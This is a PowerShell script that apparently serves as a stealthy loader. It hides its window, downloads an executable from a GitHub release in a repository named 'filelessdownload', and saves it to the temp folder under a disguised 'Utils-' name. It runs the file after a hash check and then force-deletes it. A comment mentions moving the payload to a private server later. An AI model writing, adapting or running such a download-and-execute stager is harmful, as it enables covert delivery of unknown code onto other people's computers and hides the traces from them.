# no worries, ill do with a private server later
-WindowStyle Hidden
$Host.UI.RawUI.BackgroundColor = "Black"
$downloadUrl = "https://github.com/mateuscobe-max/filelessdownload/releases/download/latest/32759017815.exe"
$expectedHash = "AD6D7289E40B8BB2502267ECC8B36A4FF25068AADFA5441F9EC1325C16EB467B".ToUpperInvariant()
$tempFile = Join-Path $env:TEMP ("Utils-" + [Guid]::NewGuid().ToString("N") + ".exe")

try {

    Invoke-WebRequest `
        -Uri $downloadUrl `
        -OutFile $tempFile `
        -UseBasicParsing

    if (-not (Test-Path $tempFile)) {
        throw "Download failed."
    }


    $actualHash = (Get-FileHash -Path $tempFile -Algorithm SHA256).Hash.ToUpperInvariant()

    if ($actualHash -ne $expectedHash) {
        throw "SHA-256 verification failed."
    }



    $process = Start-Process `
        -FilePath $tempFile `
        -PassThru
    $process.WaitForExit()

}
catch {
    Write-Error $_.Exception.Message
}
finally {
    if (Test-Path $tempFile) {
        Remove-Item `
            -Path $tempFile `
            -Force `
            -ErrorAction SilentlyContinue
    }
}
